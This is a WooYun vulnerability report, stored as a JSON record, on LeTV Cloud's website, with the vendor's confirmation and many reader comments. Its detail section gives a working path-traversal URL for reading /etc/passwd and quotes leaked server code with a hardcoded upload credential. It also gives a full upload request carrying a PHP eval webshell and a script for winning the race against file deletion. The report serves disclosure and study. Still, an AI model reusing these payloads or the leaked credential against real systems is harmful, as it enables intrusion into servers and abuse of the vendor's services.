{"id": 47301, "wybug_id": "wooyun-2014-087250", "wybug_title": "乐视云主站可getshell", "wybug_corp": "乐视网", "wybug_author": "杀器王子", "wybug_date": "2014-12-15 16:54", "wybug_open_date": "2015-01-29 16:56", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向公众公开  简要描述： 乐视云主站由于代码上的设计权限 fuzz可getshell 详细说明：  http://www.letvcloud.com/api/docdownload/?filename=../../../../../../../../../../../etc/passwd 可以任意文件下载\n\n读这个文件www/Home/Lib/Action/VideoAction.class.php1387行开始\n}else{//只支持jpeg格式上传\t\t\t\t\t$max_file_size = 2000000;//上传文件大小限制最大为2M, 单位BYTE\t\t\t\t\tif($file['type'] != 'image/jpeg' && $file['type'] != 'image/pjpeg'){\t\t\t\t\t\t$error_message = \"<font color='red'>图片只支持jpg格式！</font>\";\t\t\t\t\t\techo '\t\t\t\t\t\t\t\t\t\t\t<script>\t\t\t\t\t\t\t\t(function(){\t\t\t\t\t\t\t\t\tparent.document.getElementById(\"'.$txtid.'\").innerHTML=\"'.$error_message.'\";\t\t\t\t\t\t\t\t})();\t\t\t\t\t\t\t</script>\t\t\t\t\t\t\t';\t\t\t\t\t\texit;\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\tif($max_file_size < $file[\"size\"]){\t\t\t\t\t\t$error_message = \"<font color='red'>文件最大不应超过2M！</font>\";\t\t\t\t\t\techo '\t\t\t\t\t\t\t\t\t\t\t<script>\t\t\t\t\t\t\t\t(function(){\t\t\t\t\t\t\t\t\tparent.document.getElementById(\"'.$txtid.'\").innerHTML=\"'.$error_message.'\";\t\t\t\t\t\t\t\t})();\t\t\t\t\t\t\t</script>\t\t\t\t\t\t\t';\t\t\t\t\t\texit;\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t\t\t\t\t\t$dest_folder = \"Public/img/\";\t\t\t\tif(!file_exists($dest_folder)){\t\t\t\t\tmkdir($dest_folder);\t\t\t\t}\t\t\t\t\t\t\t\t$pinfo=pathinfo($file['name']);\t\t\t\t$newfilename = md5(time()).\".\".$pinfo['extension'];\t\t\t\t$destination = $dest_folder.$newfilename;\t\t\t\tif( move_uploaded_file ($filename, $destination) ){\t\t\t\t\t$url = 'http://upload.letvcdn.com:8000/single_upload_tool.php'; \t\t\t\t\t$data = array( \t\t\t\t\t\t\"isphone \" => \"1\", \t\t\t\t\t\t\"username\" =>\"isleju\", \t\t\t\t\t\t\"md5str\" =>\"26f6c33c801913158424f7d3fbd6d0c3\", \t\t\t\t\t\t\"single_upload_submit\" => \"\", \t\t\t\t\t\t\"single_upload_file\" => \"@\".realpath($destination), //文件名改为你要上传的文件名称 \t\t\t\t\t\t\"single_upload_submit\"=>\"ok\" \t\t\t\t\t); \t                $urldatajson = uploadByCURL($data,$url);\t                $urldata = json_decode($urldatajson,true);\t                \t\t\t\t\tunlink($destination);\n把上传的文件进行了unlink，但是中间有一步上传到其他服务器，会留下时间差利用这个时间差 我们可以getshell第一个包\nPOST /video/imgupload HTTP/1.1Host: www.letvcloud.comProxy-Connection: keep-aliveContent-Length: 450Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.letvcloud.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGFLdcAPyYpQq380JReferer: http://www.letvcloud.com/video/edit/videoid/8682339Accept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: LETVCLOUDID=705140aba5a3dc13e1222394352ade2b; Hm_lvt_984e73b4d6ff5ece34ec3da984ece290=1418609297; Hm_lpvt_984e73b4d6ff5ece34ec3da984ece290=1418631122------WebKitFormBoundaryGFLdcAPyYpQq380JContent-Disposition: form-data; name=\"txtid\"load_message------WebKitFormBoundaryGFLdcAPyYpQq380JContent-Disposition: form-data; name=\"headImg\"headImg------WebKitFormBoundaryGFLdcAPyYpQq380JContent-Disposition: form-data; name=\"upfile\"; filename=\"test§1§.php\"Content-Type: image/jpeg<?php fputs(fopen('f.php','w'),'<?php eval($_POST[f])?>');?>------WebKitFormBoundaryGFLdcAPyYpQq380J--\n开20个线程不停发包，会不断的生成php文件并传往其他服务器然后用下面脚本\n<?php$url=\"http://www.letvcloud.com/Public/img/\".md5(time()).\".php\";echo $url;file_get_contents($url);php?>\n开一个更高线程发包在文件被删除前 访问上传成功的php 会重新写入一个php导致getshell   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 杀器王子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-12-15 18:00 厂商回复： 必须修复~~~~~王子，好人啊~~~~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-15 16:57 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  要不要打雷，我在犹豫    \n     2014-12-15 16:58 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  乐视的还能下班吗？    \n     2014-12-15 17:00 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  大杀器放出来就劈    \n     2014-12-15 17:15 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  “大王杀不杀，杀不杀，杀不杀？”“杀，杀，杀！”     \n     2014-12-15 17:16 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  挺牛的    \n     2014-12-15 17:17 |    \t\tnextdoor \t\t\t( 普通白帽子  |\t\t\t        Rank:325 漏洞数:74        )\t\t \n  以为是乐视主站    \n     2014-12-15 17:54 |    \t\t盛大网络(乌云厂商)\t\t \n  ......    \n     2014-12-15 18:16 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  屌！    \n     2014-12-15 18:18 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  牛!    \n     2014-12-15 20:26 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  @浩天 把漏洞详情悄悄发给我，我帮你看看要不要打雷，嘿嘿~    \n     2014-12-15 21:21 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  屌    \n     2014-12-17 11:40 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  坐等公开    \n     2014-12-22 17:06 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  屌    \n     2015-01-29 17:16 |    \t\tgreg.wu \t\t\t( 普通白帽子  |\t\t\t        Rank:815 漏洞数:99        | 打酱油的~)\t\t \n  好经典的案例    \n     2015-01-29 17:44 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  脑洞大开可以雷1    \n     2015-01-29 18:22 |    \t\tdiguoji \t\t\t( 普通白帽子  |\t\t\t        Rank:323 漏洞数:79        | 中国吉林长春)\t\t \n  牛B    \n     2015-01-30 10:41 |    \t\tPSoul \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        )\t\t \n  我想知道。。从任意文件下载是如何联系到读取www/Home/Lib/Action/VideoAction.class.php这个文件的？？在盲猜的情况下弄到源码么？？而且为什么这么准刚好这个文件有漏洞    \n     2015-01-30 10:57 |    \t\tplane636 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:16        )\t\t \n  同楼上    \n     2015-01-30 11:57 |    \t\t杀器王子  \t\t\t( 普通白帽子  |\t\t\t        Rank:1532 漏洞数:121        | 磨刀霍霍向猪羊)\t\t \n  @PSoul 一个框架读到入口文件了 爬整个源码很难么？    \n     2015-01-30 13:03 |    \t\tPSoul \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        )\t\t \n  @杀器王子 好吧，小菜鸟出丑了 ：）    \n     2015-01-31 22:14 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  思路    \n     2015-02-05 13:10 |    \t\t斯杰 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | By：S丶jer)\t\t \n  思路    \n     2015-04-21 19:42 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  大牛调整线程数目的tip是啥呢/    \n     2015-04-21 20:18 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  利用竞争条件getshell的真实案例，杀气王子好厉害。。。    \n     2015-04-21 21:13 |    \t\tblackexp \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:13        | 一点一点的渗透到...)\t\t \n  学习了，这思路真棒    \n     2015-04-23 09:27 |    \t\tRoar \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | Hello world.)\t\t \n  杀意已决    \n     2015-05-07 17:40 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  屌爆了    \n     2015-07-31 13:28 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  第一次看到这么新颖的思路(⊙０⊙)    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}